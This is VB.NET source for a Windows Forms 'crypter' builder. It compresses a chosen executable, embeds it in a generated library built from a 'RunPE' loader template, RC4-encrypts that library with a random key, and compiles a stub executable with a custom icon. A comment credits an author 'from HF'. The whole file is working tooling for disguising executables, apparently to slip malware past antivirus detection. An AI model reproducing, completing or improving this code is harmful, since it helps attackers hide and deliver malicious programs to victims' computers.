Imports System.Text
Imports System.IO.Compression
Imports System.Threading.Thread
Imports System.IO

Public Class Form1

    Private fileBytes As Byte() = Nothing
    Private keyBytes As Byte() = Nothing
    Private resources_Path As String = Application.StartupPath & "\2016.resources"
    Private library_Name As String = Random(8)
    Private library_Path As String = Application.StartupPath & "\" & library_Name & ".dll"

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim o As New OpenFileDialog
        o.Filter = "Portable Executable |*.exe"

        If o.ShowDialog = vbOK Then
            TextBox1.Text = o.FileName
            fileBytes = IO.File.ReadAllBytes(TextBox1.Text)
            Button3.Enabled = True
            CheckBox1.Enabled = True
        End If
    End Sub

    Private Function Random(numberChar As Integer) As String
        Dim alphabet As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Dim password As String = New String((alphabet.OrderBy(Function(n) Guid.NewGuid).Take(numberChar)).ToArray())
        Return password
    End Function

    Public Shared Function Compress(data As Byte()) As Byte()
        Dim output As New MemoryStream()
        Dim gzip As New GZipStream(output, CompressionMode.Compress, True)
        gzip.Write(data, 0, data.Length)
        gzip.Close()
        Return output.ToArray()
    End Function

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked Then
            GroupBox2.Enabled = True
        Else
            GroupBox2.Enabled = False
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim o As New OpenFileDialog
        o.Filter = "Icon File |*.ico"

        If o.ShowDialog = vbOK Then
            TextBox2.Text = o.FileName
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim Source As String = My.Resources.Stub
        Dim Library As String = My.Resources.RunPE
        Dim fileName As String = IO.Path.GetFileNameWithoutExtension(TextBox1.Text)
        Dim s As New SaveFileDialog
        s.Filter = "Portable Executable |*.exe"

        If s.ShowDialog = vbOK Then
            keyBytes = Encoding.Default.GetBytes(Random(16))
            fileBytes = Compress(fileBytes)

            Library = Library.Replace("%FileName%", fileName)

            Using R As New Resources.ResourceWriter(resources_Path)
                R.AddResource(fileName, fileBytes)
                R.Generate()
            End Using

            Codedom.compile_Core(Library, library_Path, resources_Path, True)
            Sleep(500)
            IO.File.Delete(resources_Path)
            fileBytes = IO.File.ReadAllBytes(library_Path)
            IO.File.Delete(library_Path)

            Source = Source.Replace("%libraryName%", library_Name)
            Source = Source.Replace("%keyBytes%", Encoding.Default.GetString(keyBytes))

            Using R As New Resources.ResourceWriter(resources_Path)
                R.AddResource(library_Name, Encoding.Default.GetString(Proper_RC4(fileBytes, keyBytes)))
                R.Generate()
            End Using

            Codedom.compile_Stub(Source, s.FileName, resources_Path, True, TextBox2.Text)

        End If

    End Sub

    Private Shared Function Proper_RC4(ByVal Input As Byte(), ByVal Key As Byte()) As Byte()
        'Leave a thanks at least..
        'by d3c0mpil3r from HF
        Dim i, j, swap As UInteger
        Dim s As UInteger() = New UInteger(255) {}
        Dim Output As Byte() = New Byte(Input.Length - 1) {}

        For i = 0 To 255
            s(i) = i
        Next

        For i = 0 To 255
            j = (j + Key(i Mod Key.Length) + s(i)) And 255
            swap = s(i) 'Swapping of s(i) and s(j)
            s(i) = s(j)
            s(j) = swap
        Next

        i = 0 : j = 0
        For c = 0 To Output.Length - 1
            i = (i + 1) And 255
            j = (j + s(i)) And 255
            swap = s(i) 'Swapping of s(i) and s(j)
            s(i) = s(j)
            s(j) = swap
            Output(c) = Input(c) Xor s((s(i) + s(j)) And 255)
        Next

        Return Output
    End Function

End Class
